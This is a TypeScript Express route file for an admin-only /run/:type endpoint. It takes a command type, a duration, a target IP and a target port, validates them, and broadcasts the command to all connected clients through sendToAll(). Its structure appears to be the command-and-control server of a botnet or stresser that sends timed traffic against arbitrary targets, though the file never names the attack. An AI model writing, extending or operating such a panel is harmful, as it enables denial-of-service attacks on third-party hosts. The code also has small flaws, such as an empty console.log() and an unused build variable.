import express, { type Request, type Response, type Router } from "express";
import { TokenManager } from "@/tokens";
import { SocketManager } from "@/clients";
import { Command as BaseCommand, CommandType } from "@/command";

export const commandRouter: Router = express.Router();

interface Command { type: CommandType; duration: number; targetIp: string; targetPort: number; }

const validateCommand = (cmd: Command): string | null => {
    if (!Object.values(CommandType).includes(cmd.type)) {
        return "Invalid command type.";
    }
    if (!Number.isInteger(cmd.duration) || cmd.duration <= 0) {
        return "Duration must be a positive integer.";
    }
    if (!/^(\d{1,3}\.){3}\d{1,3}$/.test(cmd.targetIp)) {
        return "Invalid IP address format.";
    }
    if (!Number.isInteger(cmd.targetPort) || cmd.targetPort < 1 || cmd.targetPort > 65535) {
        return "Port must be between 1 and 65535.";
    }
    return null;
};

commandRouter.post("/run/:type", async (req: Request, res: Response) => {
    const authHeader = req.headers.authorization;
    const _type = req.params.type;
    const type = parseInt(_type);

    const { duration, targetIp, targetPort }: Command = req.body;

    if (!authHeader) {
        return res.status(401).json({ error: "Missing Authorization header" });
    }

    if (!_type) {
        return res.status(401).json({ error: "Missing type param" });
    }

    if (!await TokenManager.tokenHasRole(authHeader, 'admin')) {
        return res.status(403).json({ error: "Token or role not valid for this action." });
    }

    let commandValidation = validateCommand({ type, duration, targetIp, targetPort });

    if(commandValidation !== null) {
        return res.status(401).json({ error: commandValidation })
    }


    let cmd = new BaseCommand(type, duration, targetIp, targetPort);
    let build = cmd.build();
    
    console.log();

    await cmd.sendToAll();

    return res.status(200).json({ message: 'Successfully ran command' });
});